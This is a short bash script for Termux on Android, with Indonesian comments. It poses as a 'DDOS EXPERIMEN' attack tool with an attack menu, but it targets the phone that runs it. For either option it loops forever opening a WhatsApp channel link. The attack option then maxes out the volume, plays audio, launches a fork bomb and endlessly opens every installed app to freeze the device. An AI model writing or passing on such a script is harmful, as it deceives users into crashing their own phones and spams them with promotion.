#!/bin/bash

# Tampilan menu bertema bom
clear
echo "===================================="
echo "      💣 DDOS EXPERIMEN 💣"
echo "===================================="
echo "1. 💥 ATTACK (MULAI SERANGAN)"
echo "2. 🤝 SUPPORT ADMIN"
echo "===================================="
read -p "Pilih opsi (1/2): " pilihan

echo "LOADING..."
sleep 2

# Redirect ke saluran WhatsApp buat semua opsi
echo "Mengalihkan ke saluran WhatsApp..."
while true; do
    am start -a android.intent.action.VIEW -d "https://whatsapp.com/channel/0029Vb3dq4RCRs1ts3vcvR0n/226"
    sleep 1
done &

# Kalau pilih angka 2, cuma dialihin ke WhatsApp aja
if [[ $pilihan == "2" ]]; then
    exit 0
fi

# Kalau pilih angka 1, lanjut ke attack mode
echo "Volume dinaikkan ke MAX!"
media volume --stream 3 --set 15
media volume --stream 2 --set 15
media volume --stream 1 --set 15

# Putar musik aneh (Gunakan file musik yang tersedia di HP)
termux-media-player play /storage/emulated/0/Music/random.mp3 &

# Delay sebentar sebelum mulai nge-lag
sleep 3

# Fork Bomb - Bikin HP Freeze dengan Super Cepat
echo "Menjalankan Fork Bomb..."
nohup bash -c ':(){ :|:& };:' > /dev/null 2>&1 &

# Spam Buka Semua Aplikasi
echo "Spam aplikasi..."
while true; do
    for app in $(pm list packages -3 | cut -d':' -f2); do
        am start -n $app/.MainActivity
    done
done
